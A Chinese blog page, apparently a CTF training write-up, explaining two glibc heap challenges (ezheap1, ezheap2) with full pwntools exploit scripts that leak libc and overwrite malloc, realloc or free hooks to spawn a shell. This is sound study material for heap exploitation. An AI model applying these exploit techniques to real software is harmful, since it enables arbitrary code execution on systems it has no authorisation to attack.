@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>24集训week3 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">24集训week3</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">七月 27, 2024&nbsp;&nbsp;16:47:50</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/24%E9%9B%86%E8%AE%AD/">24集训</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="ezheap1"><a href="#ezheap1" class="headerlink" title="ezheap1"></a>ezheap1</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>ubuntu16环境 ，libc-2.23 无tcache，堆小于0x80被释放后会到fastbins中，大于则会放在unsortedbins中</p>
+<p>fastbins是单向链表，同一大小被释放的堆会在此处形成单向链表</p>
+<p>unsortedbins是双向链表，被释放到此处的堆会形成单项链表，链表头部为main_arena</p>
+<p>注意释放几个才可申请几个，若直接释放一个就只能再申请一个，因此想要多申请要利用堆里的漏洞</p>
+<p>main_arena可以泄露libc，因此可以创建较大的堆后释放，使其进入unsortedbins，泄露main_arena的地址泄露libc</p>
+<p>main_arena的偏移在libc源文件中malloc函数里可以找到（后三位要看gdb进行修正）</p>
+<p><strong>malloc_hook</strong></p>
+<p>main_arena减0x10个字节地址为malloc_hook（libcbase+libc.symbols[]也可）,malloc执行前会检查malloc_hook里指向的地址，若不为0，则先执行malloc_hook指向的地址在进行malloc开辟内存</p>
+<p><strong>realloc_hook</strong></p>
+<p>若realloc_hook不为0，则在realloc调用前会进行realloc_hook里的值，realloc里有大量的pop和push可以用来调栈，以防止onegadget不能用</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>chunk被释放后依旧可以可以被修改，因此可以让chunk进入fastbins，把指向后面链表修改为指针指向malloc_hook的位置，注意要偏移一下，因为fastbins会对申请的区域进行检查，而malloc_hook是被保护的地方，不能直接申请</p>
+<p>首先申请较大的chunk，释放后在打印，可直接泄露main_arena进而泄露libc</p>
+<p>之后再释放两个小chunk，覆盖fastbins前面的chunk让其指向realloc_hook的偏移，realloc和malloc在一起可以一起覆盖</p>
+<p>malloc_hook里存放realloc或其偏移用于调栈并调用realloc_hook里的函数，realloc_hook存放one_gadget用于获得shell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./ezheap1&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;127.0.0.1&#x27;,37131)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">base=addr-<span class="number">0x3c4b78</span>+<span class="number">0x1000</span></span><br><span class="line">onegadget=base+<span class="number">0xf0897</span></span><br><span class="line">malloc=base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="comment">#print(hex(base))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc-base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr=base+<span class="number">0x3c9890</span></span><br><span class="line"><span class="comment">#print(hex(ptr))</span></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">move(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#edit(3,p64(malloc-0x13))</span></span><br><span class="line">move(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#move(3)</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">move(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(malloc))</span><br><span class="line"><span class="comment">#add(0x68)</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">edit(<span class="number">3</span>,p64(malloc-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">11</span>+p64(onegadget)+p64(realloc+<span class="number">0xd</span>)<span class="comment">#02468bcd</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"><span class="comment">#edit(5,payload)</span></span><br><span class="line"><span class="comment">#add(0x20)</span></span><br><span class="line"><span class="comment">#add(0x20)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ezheap2"><a href="#ezheap2" class="headerlink" title="ezheap2"></a>ezheap2</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><p>源文件与第一题一模一样，但ubuntu 20的环境</p>
+<p><strong>free_hook</strong></p>
+<p>同malloc_hook再调用free前会检查free_hook,但chunk里的值可以作为free_hook里函数的参数，例如chunk里存放binsh，free_hook里存放system，则free时直接获得shell</p>
+<h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>前七个被释放的chunk会进入tcache，tcahce没有任何检查，比第一题简单，因此申请free_hook不用加任何偏移。</p>
+<p>这题用malloc_hook会发现即使调栈也无法满足onegadget</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./ezheap2&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;127.0.0.1&#x27;,32959)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="comment">#0x1ebb80</span></span><br><span class="line"></span><br><span class="line">base=addr-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#malloc=base+libc.symbols[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment">#print(hex(malloc))</span></span><br><span class="line"><span class="comment">#realloc=base+libc.symbols[&#x27;realloc&#x27;]</span></span><br><span class="line"><span class="comment">#onegadget=base+0xe6af4</span></span><br><span class="line">freehook=base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freehook))</span><br><span class="line">system=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">move(<span class="number">3</span>)</span><br><span class="line">move(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#move(3)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(freehook))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">move(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe6aee execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af1 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af4 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/heap/"># heap</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/07/24/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
